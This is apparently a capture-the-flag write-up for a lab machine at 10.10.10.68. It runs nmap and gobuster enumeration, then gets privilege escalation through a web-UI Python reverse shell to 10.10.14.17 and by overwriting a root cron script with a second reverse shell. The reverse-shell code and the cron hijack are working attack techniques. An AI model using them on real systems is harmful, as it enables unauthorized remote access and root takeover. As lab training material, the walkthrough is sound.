1. Enumeration

I started with a full port scan using Nmap:

sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.10.68
  • -p- --open: Scans all 65535 ports, showing only open ones.
  • -sS: Stealth SYN scan.
  • -Pn -n: Skips host discovery and DNS resolution for speed.

Only port 80 was open. Detailed service scan:

nmap -sC -sV -p80 10.10.10.68

I added bashed.htb to my hosts file and ran Gobuster:

gobuster dir --url "http://10.10.10.68/" -w /usr/share/dirb/wordlists/small.txt

2. Privilege Escalation

To get a proper shell, I started a listener on my machine:

nc -lvnp 1234

Executed a Python reverse shell from the web UI:

python -c 'import socket,subprocess,os; \ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \ s.connect(("10.10.14.17",1234)); \ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \ p=subprocess.call(["/bin/sh","-i"]);'

Checking sudo permissions:

sudo -l

We can run commands as scriptmanager without a password. Switching users:

sudo -i -u scriptmanager

Inside /scripts, I found test.py which is executed by root. I replaced it with a root reverse shell script:

import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(("10.10.14.17",9002)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty; pty.spawn("sh")

After a minute, the cronjob executed the script and granted root access.
